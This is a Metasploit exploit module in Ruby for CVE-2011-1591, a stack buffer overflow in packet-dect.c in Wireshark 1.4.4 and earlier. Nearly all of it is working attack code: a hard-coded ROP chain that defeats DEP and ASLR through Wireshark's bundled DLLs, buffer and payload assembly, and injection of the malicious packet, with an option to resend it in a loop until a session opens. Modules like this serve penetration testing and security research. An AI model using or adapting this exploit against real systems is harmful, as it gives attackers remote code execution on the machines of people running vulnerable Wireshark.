##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark <= 1.4.4 packet-dect.c Stack Buffer Overflow (remote)',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Wireshark <= 1.4.4
        by sending an malicious packet.)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Paul Makowski',  #Initial discovery
          'sickness',       #proof of concept
          'corelanc0d3r <peter.ve[at]corelan.be>',   #rop exploit + msf module
        ],
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'CVE', '2011-1591'],
          [ 'OSVDB', '71848'],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5838' ],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5836' ],
          [ 'URL', 'http://www.exploit-db.com/exploits/17185' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'       => 936,
          'DisableNops' => 'True',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Win32 Universal (Generic DEP & ASLR Bypass)',
            {
              'OffSet' => 1243,
              'Ret'    => 0x667c484d, #libgnutl pivot - tx Lincoln
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 18 2011',
      'DefaultTarget'  => 0))

    register_options([
      OptBool.new('LOOP', [true,  'Send the packet every X seconds until the job is killed', false]),
      OptInt.new('DELAY', [true,  'This option sets the delay between sent packets', 5])
    ], self.class)

    register_advanced_options([
      OptBool.new("ExitOnSession", [ false, "Return from the exploit after a session has been created", true ]),

    ], self.class)

    deregister_options('FILTER','PCAPFILE','RHOST','SNAPLEN','TIMEOUT','UDP_SECRET','NETMASK','GATEWAY')
  end

  def junk
    return rand_text(4).unpack("L")[0].to_i
  end

  def exploit
    check_pcaprub_loaded # Check first

    ptype = "\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x23\x23"

    print_status("Preparing payload")

    pivot = [target.ret].pack('V')

    # pvefindaddr rop 'n roll
    # tx dadr00p (https://twitter.com/dietersar) for testing the offsets below
    rop_pivot =
    [
      0x618d7d0e,     # RET
      0x618d7d0e,     # RET
      0x618d7d0e,     # RET
      0x64f9d5ec,     # ADD ESP,0C # RET - libfontconfig-1.dll
      0x618d7d0e,     # RET <- don't count on this one !
      0x618d7d0e,     # RET
      0x618d7d0e,     # RET
      0x618d7d0e,     # RET
      0x61C14268,     # ADD ESP,24 # RETN - freetype6.dll
      0xFFFFFFFF,     # crash baby !
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0x618d7d0e,
      0x618d7d0e,
      0x618d7d0e,
      0x618d7d0e,
    ].pack("V*")

    rop_gadgets =
    [
      0x6d7155cb,     # PUSH ESP # POP EBX # POP EBP # RETN  **[libpangoft2-1.0-0.dll]
      junk,
      0x6d596e31,     # MOV EAX,EBX # POP EBX # POP EBP # RETN  **[libgio-2.0-0.dll]
      junk,
      junk,
      0x61c14552,     # POP EBX # RETN    ** [freetype6.dll]
      0x00000800,     # size - 0x800 should be more than enough
      0x61c14043,     # POP ESI # RETN    ** [freetype6.dll]
      0x0000009C,
      0x6d58321a,     # ADD EAX,ESI # POP ESI # POP EBP # RETN    **[libgio-2.0-0.dll]
      junk,
      junk,
      0x68610a27,     # XCHG EAX,EBP # RETN    ** [libglib-2.0-0.dll]
      0x629445a6,     # POP EAX # RETN    ** [libatk-1.0-0.dll]
      0x62d9027c,     #
      0x6c385913,     # MOV EAX,DWORD PTR DS:[EAX] # ADD CL,CL # RETN  ** [libgdk-win32-2.0-0.dll]
      0x617bc526,     # XCHG EAX,ESI # ADD AL,10 # ADD CL,CL # RETN    ** [libgtk-win32-2.0-0.dll]
      0x64f8c692,     # POP EDX # RETN    ** [libfontconfig-1.dll]
      0x00000040,     #
      0x619638db,     # POP ECX # RETN    ** [libgtk-win32-2.0-0.dll]
      0x6536B010,     # RW
      0x618d7d0d,     # POP EDI # RETN    ** [libgtk-win32-2.0-0.dll]
      0x618d7d0e,     # RET
      0x64fa0c15,     # POP EAX # RETN    ** [libfontconfig-1.dll]
      0x618d7d0e,     # RET
      0x61963fdb,     # PUSHAD # RETN     ** [libgtk-win32-2.0-0.dll]
    ].pack("V*")

    pivot = [target.ret].pack('V')

    buffer = rand_text(131)
    buffer << rop_pivot
    buffer << rop_gadgets

    nops = make_nops(target['OffSet'] - (buffer.length) - (payload.encoded.length))

    buffer << nops
    buffer << payload.encoded
    buffer << pivot

    filler = 1500 - buffer.length

    buffer << rand_text(filler)

    pkt = ptype
    pkt << buffer

    print_status("Sending malicious packet")
    open_pcap()

    #handler
    if datastore['LOOP']
      while true
        break if session_created? and datastore['ExitOnSession']
        inject(pkt)
        select(nil,nil,nil,datastore['DELAY'])
      end
    else
      inject(pkt)
    end

    close_pcap
  end
end
